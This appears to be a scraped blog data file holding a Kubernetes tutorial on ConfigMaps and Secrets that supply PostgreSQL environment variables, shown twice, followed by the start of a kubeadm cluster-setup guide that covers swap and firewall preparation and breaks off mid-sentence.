class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Pod</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">&lt;pod-name&gt;</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">containers:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">&lt;name&gt;</span></span><br><span class=\"line\">      <span class=\"attr\">image:</span> <span class=\"string\">&lt;image&gt;</span></span><br><span class=\"line\">      <span class=\"attr\">env:</span></span><br><span class=\"line\">        <span class=\"comment\"># Define the environment variable</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">&lt;variable-name&gt;</span></span><br><span class=\"line\">          <span class=\"attr\">valueFrom:</span></span><br><span class=\"line\">            <span class=\"attr\">configMapKeyRef:</span></span><br><span class=\"line\">              <span class=\"attr\">name:</span> <span class=\"string\">&lt;config-map-object&gt;</span>     </span><br><span class=\"line\">              <span class=\"attr\">key:</span> <span class=\"string\">&lt;key-name&gt;</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">&lt;variable-name&gt;</span></span><br><span class=\"line\">          <span class=\"attr\">valueFrom:</span></span><br><span class=\"line\">            <span class=\"attr\">secretKeyRef:</span></span><br><span class=\"line\">              <span class=\"attr\">name:</span> <span class=\"string\">&lt;secret-object&gt;</span>     </span><br><span class=\"line\">              <span class=\"attr\">key:</span> <span class=\"string\">&lt;key-name&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"create-a-postgresql-pod-that-uses-values-from-configmaps-and-secrets\"><a class=\"markdownIt-Anchor\" href=\"#create-a-postgresql-pod-that-uses-values-from-configmaps-and-secrets\">#</a> Create a PostgreSQL Pod that uses values from ConfigMaps and Secrets</h3>\n<h4 id=\"1-create-the-pod-manifest\"><a class=\"markdownIt-Anchor\" href=\"#1-create-the-pod-manifest\">#</a> 1- Create the Pod manifest:</h4>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Pod</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">postgresql</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">containers:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">postgres</span></span><br><span class=\"line\">      <span class=\"attr\">image:</span> <span class=\"string\">postgres</span></span><br><span class=\"line\">      <span class=\"attr\">ports:</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">containerPort:</span> <span class=\"number\">5432</span></span><br><span class=\"line\">      <span class=\"attr\">env:</span></span><br><span class=\"line\">        <span class=\"comment\"># Define the environment variable</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">POSTGRES_USER</span></span><br><span class=\"line\">          <span class=\"attr\">valueFrom:</span></span><br><span class=\"line\">            <span class=\"attr\">configMapKeyRef:</span></span><br><span class=\"line\">              <span class=\"attr\">name:</span> <span class=\"string\">config-map</span>   </span><br><span class=\"line\">              <span class=\"attr\">key:</span> <span class=\"string\">postgres-user</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">POSTGRES_DBNAME</span></span><br><span class=\"line\">          <span class=\"attr\">valueFrom:</span></span><br><span class=\"line\">            <span class=\"attr\">configMapKeyRef:</span></span><br><span class=\"line\">              <span class=\"attr\">name:</span> <span class=\"string\">config-map</span>   </span><br><span class=\"line\">              <span class=\"attr\">key:</span> <span class=\"string\">postgres-db</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">POSTGRES_PASSWORD</span></span><br><span class=\"line\">          <span class=\"attr\">valueFrom:</span></span><br><span class=\"line\">            <span class=\"attr\">secretKeyRef:</span></span><br><span class=\"line\">              <span class=\"attr\">name:</span> <span class=\"string\">database-secret</span>   </span><br><span class=\"line\">              <span class=\"attr\">key:</span> <span class=\"string\">postgres-pass</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"2-create-the-pod\"><a class=\"markdownIt-Anchor\" href=\"#2-create-the-pod\">#</a> 2- Create the Pod:</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">justk8s@justk8s-master:~$ kubectl apply -f postgres.yaml</span><br><span class=\"line\">pod/postgresql created</span><br></pre></td></tr></table></figure>\n<h4 id=\"3-list-the-created-pod\"><a class=\"markdownIt-Anchor\" href=\"#3-list-the-created-pod\">#</a> 3- List The Created Pod:</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">justk8s@justk8s-master:~$ kubectl get pods</span><br><span class=\"line\"></span><br><span class=\"line\">NAME         READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">postgresql   1/1     Running   0          8s</span><br></pre></td></tr></table></figure>\n<h4 id=\"4-test-the-database-created-with-variables-of-configmap-and-secrets\"><a class=\"markdownIt-Anchor\" href=\"#4-test-the-database-created-with-variables-of-configmap-and-secrets\">#</a> 4- Test the Database created with variables of ConfigMap and Secrets:</h4>\n<p>We can open a bash session on the pod and open the database  <code>mohamed</code>  with the  <code>psql</code>  command provided by the postgreSQL</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">justk8s@justk8s-master:~$ kubectl <span class=\"built_in\">exec</span> --stdin --<span class=\"built_in\">tty</span> postgresql  -- /bin/bash</span><br><span class=\"line\"></span><br><span class=\"line\">root@postgresql:/<span class=\"comment\"># psql -U &quot;mohamed&quot;</span></span><br><span class=\"line\">psql (14.4 (Debian 14.4-1.pgdg110+1))</span><br><span class=\"line\">Type <span class=\"string\">&quot;help&quot;</span> <span class=\"keyword\">for</span> <span class=\"built_in\">help</span>.</span><br><span class=\"line\"></span><br><span class=\"line\">mohamed=<span class=\"comment\">#</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"references\"><a class=\"markdownIt-Anchor\" href=\"#references\">#</a> References:</h4>\n<p><em><span class=\"exturl\" data-url=\"aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3MvdGFza3MvZGVidWcvZGVidWctYXBwbGljYXRpb24vZ2V0LXNoZWxsLXJ1bm5pbmctY29udGFpbmVyLw==\">Get a Shell to a Running Container</span></em></p>\n<p><em><span class=\"exturl\" data-url=\"aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3MvY29uY2VwdHMvY29uZmlndXJhdGlvbi9jb25maWdtYXAv\">ConfigMaps</span></em></p>\n<p><em><span class=\"exturl\" data-url=\"aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3MvY29uY2VwdHMvY29uZmlndXJhdGlvbi9zZWNyZXQv\">Secrets</span></em></p>\n<p><em><span class=\"exturl\" data-url=\"aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS9fL3Bvc3RncmVz\">PostgreSQL Docker</span></em></p>\n","site":{"data":{}},"length":4297,"excerpt":"","more":"<h2 id=\"an-introduction-to-kubernetes-secrets-and-configmaps\"><a class=\"markdownIt-Anchor\" href=\"#an-introduction-to-kubernetes-secrets-and-configmaps\">#</a> An introduction to Kubernetes Secrets and ConfigMaps</h2>\n<p>Kubernetes has two types of objects that can inject configuration data into a container when it starts up: Secrets and ConfigMaps. Secrets and ConfigMaps behave similarly in Kubernetes, both in how they are created and because they can be exposed inside a container as mounted files or volumes or environment variables.</p>\n<h3 id=\"to-understand-more-how-configmap-and-secrets-are-important-lets-consider-the-following-scenario\"><a class=\"markdownIt-Anchor\" href=\"#to-understand-more-how-configmap-and-secrets-are-important-lets-consider-the-following-scenario\">#</a> To understand more how configmap and secrets are important let’s consider the following scenario:</h3>\n<p>You have to run a postgres docker image on your host, you explore the documentation of this docker image provided in <em><a href=\"%22https://hub.docker.com/_/postgres%22\">DockerHub</a></em> and you find that you the PostgreSQL image uses several environment variables and there is a mandatory variable called  <code>POSTGRES_PASSWORD</code>  must be defined by running this following command:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$  docker run --name my-postgres -e POSTGRES_PASSWORD=mypassword -d postgres</span><br></pre></td></tr></table></figure>\n<h3 id=\"but-how-we-can-use-this-environment-variables-and-how-we-can-manage-them-in-kubernetes\"><a class=\"markdownIt-Anchor\" href=\"#but-how-we-can-use-this-environment-variables-and-how-we-can-manage-them-in-kubernetes\">#</a> But how we can use this environment variables and how we can manage them in kubernetes ?</h3>\n<p>We can centralize the variables environment in two types of objects and import these variables in the manifest of a pod, replicasets, or deployments</p>\n<h3 id=\"what-is-a-configmaps\"><a class=\"markdownIt-Anchor\" href=\"#what-is-a-configmaps\">#</a> What is a ConfigMaps</h3>\n<p>In Kubernetes, a ConfigMap is nothing more than a key/value pair. A ConfigMap store’s non-confidential data, meaning no passwords or API keys. Pods can consume ConfigMaps as environment variables, command-line arguments, or as configuration files in a volume.</p>\n<p>A ConfigMap allows you to decouple environment-specific configuration from your container images, so that your applications are easily portable.</p>\n<h4 id=\"example-of-confimap-manifest-that-store-the-database-name-username\"><a class=\"markdownIt-Anchor\" href=\"#example-of-confimap-manifest-that-store-the-database-name-username\">#</a> Example of confimap manifest that store the database name &amp; username:</h4>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">ConfigMap</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">config-map</span></span><br><span class=\"line\"><span class=\"attr\">data:</span></span><br><span class=\"line\">  <span class=\"attr\">postgres-db:</span> <span class=\"string\">&quot;database&quot;</span></span><br><span class=\"line\">  <span class=\"attr\">postgres-user:</span> <span class=\"string\">&quot;mohamed&quot;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"create-the-configmaps-object\"><a class=\"markdownIt-Anchor\" href=\"#create-the-configmaps-object\">#</a> Create the ConfigMaps Object:</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">justk8s@justk8s-master:~$ kubectl apply -f first-configmap.yaml</span><br><span class=\"line\">configmap/config-map created</span><br></pre></td></tr></table></figure>\n<h4 id=\"list-the-configmap-objects\"><a class=\"markdownIt-Anchor\" href=\"#list-the-configmap-objects\">#</a> List the ConfigMap Objects:</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">justk8s@justk8s-master:~$ kubectl get configmap</span><br><span class=\"line\">NAME               DATA   AGE</span><br><span class=\"line\">config-map         2      26s</span><br><span class=\"line\">kube-root-ca.crt   1      13h</span><br></pre></td></tr></table></figure>\n<h3 id=\"what-is-a-secrets\"><a class=\"markdownIt-Anchor\" href=\"#what-is-a-secrets\">#</a> What is a Secrets:</h3>\n<p>Secrets are a Kubernetes object intended for storing a small amount of sensitive data. It is worth noting that Secrets are stored base64-encoded within Kubernetes, so they are not wildly secure.<br>\nSecrets are similar to ConfigMaps but are specifically intended to hold confidential data.</p>\n<h4 id=\"example-of-confimap-manifest-that-store-the-database-password\"><a class=\"markdownIt-Anchor\" href=\"#example-of-confimap-manifest-that-store-the-database-password\">#</a> Example of confimap manifest that store the database password:</h4>\n<p>we must encode the value that we will stored in the Secrets</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">justk8s@justk8s-master:~$ <span class=\"built_in\">echo</span> -n <span class=\"string\">&quot;mohamed&quot;</span> | <span class=\"built_in\">base64</span></span><br><span class=\"line\">bW9oYW1lZA==</span><br></pre></td></tr></table></figure>\n<p>Now we can use the base64 cipher in the Secret manifest</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Secret</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">database-secret</span></span><br><span class=\"line\"><span class=\"attr\">type:</span> <span class=\"string\">Opaque</span></span><br><span class=\"line\"><span class=\"attr\">data:</span></span><br><span class=\"line\">  <span class=\"attr\">postgres-pass:</span> <span class=\"string\">&quot;bW9oYW1lZA==&quot;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"create-the-configmaps-object-2\"><a class=\"markdownIt-Anchor\" href=\"#create-the-configmaps-object-2\">#</a> Create the ConfigMaps Object:</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">justk8s@justk8s-master:~$ kubectl apply -f first-secret.yaml</span><br><span class=\"line\">secret/database-secret created</span><br></pre></td></tr></table></figure>\n<h4 id=\"list-the-configmap-objects-2\"><a class=\"markdownIt-Anchor\" href=\"#list-the-configmap-objects-2\">#</a> List the ConfigMap Objects:</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">justk8s@justk8s-master:~$ kubectl get secrets</span><br><span class=\"line\">NAME                  TYPE                                  DATA   AGE</span><br><span class=\"line\">database-secret       Opaque                                1      8s</span><br><span class=\"line\">default-token-xl8sl   kubernetes.io/service-account-token   3      13h</span><br></pre></td></tr></table></figure>\n<h3 id=\"how-to-use-configmaps-and-secrets-values-in-a-pod\"><a class=\"markdownIt-Anchor\" href=\"#how-to-use-configmaps-and-secrets-values-in-a-pod\">#</a> How to use ConfigMaps and Secrets values in a Pod</h3>\n<p>we can use the values from  <code>ConfigMaps</code>  and  <code>Secrets</code>  in the pod manifests in the  <code>env</code>  propriety of the container by using the  <code>valueFrom</code>  field that can import values from configMap and Secrets</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Pod</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">&lt;pod-name&gt;</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">containers:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">&lt;name&gt;</span></span><br><span class=\"line\">      <span class=\"attr\">image:</span> <span class=\"string\">&lt;image&gt;</span></span><br><span class=\"line\">      <span class=\"attr\">env:</span></span><br><span class=\"line\">        <span class=\"comment\"># Define the environment variable</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">&lt;variable-name&gt;</span></span><br><span class=\"line\">          <span class=\"attr\">valueFrom:</span></span><br><span class=\"line\">            <span class=\"attr\">configMapKeyRef:</span></span><br><span class=\"line\">              <span class=\"attr\">name:</span> <span class=\"string\">&lt;config-map-object&gt;</span>     </span><br><span class=\"line\">              <span class=\"attr\">key:</span> <span class=\"string\">&lt;key-name&gt;</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">&lt;variable-name&gt;</span></span><br><span class=\"line\">          <span class=\"attr\">valueFrom:</span></span><br><span class=\"line\">            <span class=\"attr\">secretKeyRef:</span></span><br><span class=\"line\">              <span class=\"attr\">name:</span> <span class=\"string\">&lt;secret-object&gt;</span>     </span><br><span class=\"line\">              <span class=\"attr\">key:</span> <span class=\"string\">&lt;key-name&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"create-a-postgresql-pod-that-uses-values-from-configmaps-and-secrets\"><a class=\"markdownIt-Anchor\" href=\"#create-a-postgresql-pod-that-uses-values-from-configmaps-and-secrets\">#</a> Create a PostgreSQL Pod that uses values from ConfigMaps and Secrets</h3>\n<h4 id=\"1-create-the-pod-manifest\"><a class=\"markdownIt-Anchor\" href=\"#1-create-the-pod-manifest\">#</a> 1- Create the Pod manifest:</h4>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Pod</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">postgresql</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">containers:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">postgres</span></span><br><span class=\"line\">      <span class=\"attr\">image:</span> <span class=\"string\">postgres</span></span><br><span class=\"line\">      <span class=\"attr\">ports:</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">containerPort:</span> <span class=\"number\">5432</span></span><br><span class=\"line\">      <span class=\"attr\">env:</span></span><br><span class=\"line\">        <span class=\"comment\"># Define the environment variable</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">POSTGRES_USER</span></span><br><span class=\"line\">          <span class=\"attr\">valueFrom:</span></span><br><span class=\"line\">            <span class=\"attr\">configMapKeyRef:</span></span><br><span class=\"line\">              <span class=\"attr\">name:</span> <span class=\"string\">config-map</span>   </span><br><span class=\"line\">              <span class=\"attr\">key:</span> <span class=\"string\">postgres-user</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">POSTGRES_DBNAME</span></span><br><span class=\"line\">          <span class=\"attr\">valueFrom:</span></span><br><span class=\"line\">            <span class=\"attr\">configMapKeyRef:</span></span><br><span class=\"line\">              <span class=\"attr\">name:</span> <span class=\"string\">config-map</span>   </span><br><span class=\"line\">              <span class=\"attr\">key:</span> <span class=\"string\">postgres-db</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">POSTGRES_PASSWORD</span></span><br><span class=\"line\">          <span class=\"attr\">valueFrom:</span></span><br><span class=\"line\">            <span class=\"attr\">secretKeyRef:</span></span><br><span class=\"line\">              <span class=\"attr\">name:</span> <span class=\"string\">database-secret</span>   </span><br><span class=\"line\">              <span class=\"attr\">key:</span> <span class=\"string\">postgres-pass</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"2-create-the-pod\"><a class=\"markdownIt-Anchor\" href=\"#2-create-the-pod\">#</a> 2- Create the Pod:</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">justk8s@justk8s-master:~$ kubectl apply -f postgres.yaml</span><br><span class=\"line\">pod/postgresql created</span><br></pre></td></tr></table></figure>\n<h4 id=\"3-list-the-created-pod\"><a class=\"markdownIt-Anchor\" href=\"#3-list-the-created-pod\">#</a> 3- List The Created Pod:</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">justk8s@justk8s-master:~$ kubectl get pods</span><br><span class=\"line\"></span><br><span class=\"line\">NAME         READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">postgresql   1/1     Running   0          8s</span><br></pre></td></tr></table></figure>\n<h4 id=\"4-test-the-database-created-with-variables-of-configmap-and-secrets\"><a class=\"markdownIt-Anchor\" href=\"#4-test-the-database-created-with-variables-of-configmap-and-secrets\">#</a> 4- Test the Database created with variables of ConfigMap and Secrets:</h4>\n<p>We can open a bash session on the pod and open the database  <code>mohamed</code>  with the  <code>psql</code>  command provided by the postgreSQL</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">justk8s@justk8s-master:~$ kubectl <span class=\"built_in\">exec</span> --stdin --<span class=\"built_in\">tty</span> postgresql  -- /bin/bash</span><br><span class=\"line\"></span><br><span class=\"line\">root@postgresql:/<span class=\"comment\"># psql -U &quot;mohamed&quot;</span></span><br><span class=\"line\">psql (14.4 (Debian 14.4-1.pgdg110+1))</span><br><span class=\"line\">Type <span class=\"string\">&quot;help&quot;</span> <span class=\"keyword\">for</span> <span class=\"built_in\">help</span>.</span><br><span class=\"line\"></span><br><span class=\"line\">mohamed=<span class=\"comment\">#</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"references\"><a class=\"markdownIt-Anchor\" href=\"#references\">#</a> References:</h4>\n<p><em><span class=\"exturl\" data-url=\"aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3MvdGFza3MvZGVidWcvZGVidWctYXBwbGljYXRpb24vZ2V0LXNoZWxsLXJ1bm5pbmctY29udGFpbmVyLw==\">Get a Shell to a Running Container</span></em></p>\n<p><em><span class=\"exturl\" data-url=\"aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3MvY29uY2VwdHMvY29uZmlndXJhdGlvbi9jb25maWdtYXAv\">ConfigMaps</span></em></p>\n<p><em><span class=\"exturl\" data-url=\"aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3MvY29uY2VwdHMvY29uZmlndXJhdGlvbi9zZWNyZXQv\">Secrets</span></em></p>\n<p><em><span class=\"exturl\" data-url=\"aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS9fL3Bvc3RncmVz\">PostgreSQL Docker</span></em></p>\n"},{"title":"Setting Up Kubernetes with Kubeadm","date":"2022-08-05T10:54:12.000Z","cover":"https://i.imgur.com/bhUlMFS.png","_content":"[Kubeadm]{.red} is a tool used to build Kubernetes (K8s) clusters. Kubeadm performs the actions necessary to get a minimum viable cluster up and running quickly. By design, it cares only about bootstrapping, not about provisioning machines (underlying worker and master nodes).\n\n:::success\nKnowing how to use kubeadm is required for CKA and CKS exams\n:::\n\nWe configure a 3 [Ubuntu 20.04 LTS]{.pinky} machines in the same network with the following proprietes:\n| Role   | Hostname         | IP address      | \n| -------| ---------------- | --------------- |\n| Master | 4n6nk8s-master   | 192.168.1.18/24 | \n| Worker | 4n6nk8s-worker1  | 192.168.1.19/24 | \n| Worker | 4n6nk8s-worker2  | 192.168.1.20/24 | \n\n> Note: Make sure to setup a unique hostname for each host\n\n## Prepare the environments\nThe following Steps must be applied to each node (both master nodes and worker nodes)\n### Disable the Swap Memory\nThe Kubernetes requires that you disable the swap memory in the host system because the kubernetes scheduler determines the best available node on which to deploy newly created pods. If memory swapping is allowed to occur on a host system, this can lead to performance and stability issues within Kubernetes\n\nYou can disable the swap memory by deleting or commenting the swap entry in `/etc/fstab` manually or using the `sed` command\n\n```bash command line prompt\n4n6nk8s@4n6nk8s-master$ sudo swapoff -a && sudo sed -i '/ swap / s/^\\(.*\\)$/#\\1/g' /etc/fstab\n```\n\nThis command disbales the swap memory and comments out the swap entry in `/etc/fstab` \n\n### Configure or Disable the firewall\nWhen running Kubernetes in an environment with strict network boundaries, such as on-premises datacenter with physical network firewalls or Virtual Networks in Public Cloud, it is useful to be aware of the ports and protocols used by Kubernetes components.\n\nThe ports used by Master Node:\n\n| Protocol  | Direction     | Port Range    |  Purpose \n| -------   | ------------- | ------------- | -------\n| TCP       | Inbound       | 6443          | Kubernetes API server\n| TCP       | Inbound       | 2379-2380     | etcd server client API\n| TCP       | Inbound       | 10250         | Kubelet API\n| TCP       | Inbound       | 10259         | kube-scheduler\n| TCP       | Inbound       | 10257         | kube-controller-manager\n\nThe ports used by Worker Nodes: \n\n| Protocol  | Direction     | Port Range    |  Purpose \n| -------   | ------------- | ------------- | -------\n| TCP       | Inbound       | 10250         | Kubelet API\n| TCP       | Inbound       | 30000-32767   | NodePort Services\n\n\nYou can either disable the firewall or allow the ports on each node.\n#### Method 1: Add firewall rules to allow the ports used by the Kubernetes nodes\nAllow the ports used by the master node:\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 6443/tcp\n4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 2379:2380/tcp\n4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 10250/tcp\n4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 10259/tcp\n4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 10257/tcp\n```\nAllow the ports used by the worker nodes:\n```bash command line prompt\n4n6nk8s@4n6nk8s-worker1:~$ sudo ufw allow 10250/tcp\n4n6nk8s@4n6nk8s-worker1:~$ sudo ufw allow 30000:32767/tcp\n```\n#### Method 2: Disable the firewall\n```bash command line prompt command\n4n6nk8s@4n6nk8s-master:~$ sudo ufw status\nStatus: active\n\n4n6nk8s@4n6nk8s-master:~$ sudo ufw disable\nFirewall stopped and disabled on system startup\n\n4n6nk8s@4n6nk8s-master:~$ sudo ufw status\nStatus: inactive\n```\n\n### Installing Docker Engine\nKubernetes requires you 